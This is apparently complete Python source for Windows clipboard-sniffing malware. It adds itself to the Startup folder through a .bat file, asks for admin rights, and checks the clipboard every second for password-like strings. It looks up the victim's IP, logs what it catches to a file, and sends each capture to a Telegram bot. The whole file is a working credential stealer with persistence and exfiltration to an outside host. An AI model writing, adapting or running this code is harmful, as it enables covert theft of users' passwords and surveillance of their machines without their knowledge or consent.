import ctypes
import getpass as gp
import http.client
import sys
import time
from ctypes import windll
from datetime import datetime
import pyperclip
import regex as re
import requests

MY_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
# telegram token and id
TOKEN = 'som_token'
ADMIN_ID = 'some_id'
USER_NAME = gp.getuser()
PATH_EXE = f'C:/Users/{USER_NAME}/Downloads/get_pass_to_comp.exe'
BAT_PATH = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/' \
           f'Windows/Start Menu/Programs/Startup/'


# add script to autorun
def is_admin_create_bat():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if is_admin_create_bat():
    with open(BAT_PATH + '\\' + 'open.bat', 'w+') as bat_file:
        bat_file.write(f'start ""  {PATH_EXE}')
else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

is_admin_create_bat()

# Clean clipboard before start interception
if windll.user32.OpenClipboard(None):
    windll.user32.EmptyClipboard()
    windll.user32.CloseClipboard()


# find digits and letters in string:
def interceptor_passwords(clip_string):
    rx = re.compile(r'(?=\d++[A-Za-z]+[\w@]+|[a-zA-Z]++[\w@]+)[\w@]{2,}')
    return '\n'.join(rx.findall(clip_string))


# find ip
def find_ip():
    conn = http.client.HTTPConnection('ifconfig.me')
    conn.request('GET', '/ip')
    try:
        return conn.getresponse().read()
    except:
        return 'Can not find ip'


# variable for ip
ip = find_ip()

# string for intercept pass
pass_string = ''

while True:
    # create / open file for save passwords:
    f = open('intercepted_passwords.txt', 'a')
    # assign string to clipboard:
    clipboard_string = pyperclip.paste()
    # check password in list and check is link or not:
    for x in interceptor_passwords(clipboard_string):
        if clipboard_string != pass_string and 'http' not in clipboard_string:
            caught_pass = interceptor_passwords(clipboard_string)
            # format message to telegram
            message = f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id=' \
                      f'{ADMIN_ID}&text={f"Password: {caught_pass} used {MY_TIME} IP: {ip}"}'
            if caught_pass is not None:
                # add intercepted pass and used time to doc:
                print(caught_pass, 'used', MY_TIME, 'IP:', ip, file=f)
                f.close()
                # send message to telegram
                requests.get(message)
        pass_string = clipboard_string
    time.sleep(1)
